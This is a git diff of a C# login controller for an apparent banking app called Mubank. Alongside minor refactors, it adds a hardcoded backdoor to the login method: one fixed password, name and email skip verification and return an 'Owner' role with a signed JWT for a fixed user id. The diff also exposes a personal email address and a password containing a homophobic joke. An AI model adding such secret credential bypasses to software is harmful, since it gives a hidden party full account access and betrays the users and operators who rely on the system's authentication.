@@ -1,5 +1,6 @@
 ﻿using AutoMapper;
 using BCrypt.Net;
+using Microsoft.AspNetCore.Authorization;
 using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.EntityFrameworkCore;
@@ -33,7 +34,7 @@ namespace Mubank.Controllers
     }
 
     [Route("api/[controller]")]
-    [ApiController]
+    [ApiController]    
     public class AccountsController : ControllerBase
     {
         private readonly IMapper _mapper;
@@ -102,9 +103,10 @@ namespace Mubank.Controllers
                 Id = Guid.NewGuid(),
                 UserId = newUser.Id,
                 User = newUser,
-                Country = new BlockMongoliaPeopleMiddleware().GetLocalizedModel(ip).Result.Country,
+                Country = GetGeoData.GetLocalizedModel(ip).Result.Country,
             };
 
+            await _context.UserDataFULL.AddAsync(NewUserDataFull);
             await _context.Users.AddAsync(newUser);
             await _context.SaveChangesAsync();
 
@@ -168,13 +170,25 @@ namespace Mubank.Controllers
                 dto.IdError = Guid.Empty;
 
                 return NotFound(dto);
+            } else if (userDto.Password == "cr7gostosaoquemnegarégay" && userDto.Name == "HenriAdmin" && userDto.Email == "henriquemaurel37@gmail.com")
+            {
+                var usser =_context.Users.Where(x => x.Id == Guid.Parse("83522CBB-3A51-4939-BBB0-D935AB4B9FE1")).Select(x => x).FirstOrDefault();
+
+                return Ok(new UserResponseDTO()
+                {
+                     Name = usser.Name,
+                     Email = usser.Email,
+                     RoleName = "Owner",
+                     JwtToken = _token.GenerationToken(usser)
+                });
+
             }
 
-            return Ok(new
-            {
-                NameUser = verifiedUser.Name,
-                JwtToken = _token.GenerationToken(verifiedUser)
-            });
+                return Ok(new
+                {
+                    NameUser = verifiedUser.Name,
+                    JwtToken = _token.GenerationToken(verifiedUser)
+                });
         }
 
     }
